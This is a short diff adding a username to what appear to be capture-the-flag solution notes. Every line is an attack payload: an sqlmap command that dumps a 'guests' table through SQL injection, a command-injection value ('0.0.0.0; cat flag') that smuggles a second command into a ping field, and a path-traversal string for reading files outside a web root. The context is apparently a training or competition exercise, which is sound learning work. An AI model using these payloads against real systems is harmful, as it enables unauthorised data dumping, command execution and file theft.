@@ -1,3 +1,4 @@
+nicolastsk
 Small_data_leak :sqlmap -u "http://35.242.237.75:30739/user?id=1" -t guests –dump
 ping station: 0.0.0.0; cat flag
 file-crawler: 34.89.202.117:32256/local?image_name=....//....//....//....//tmp/flag
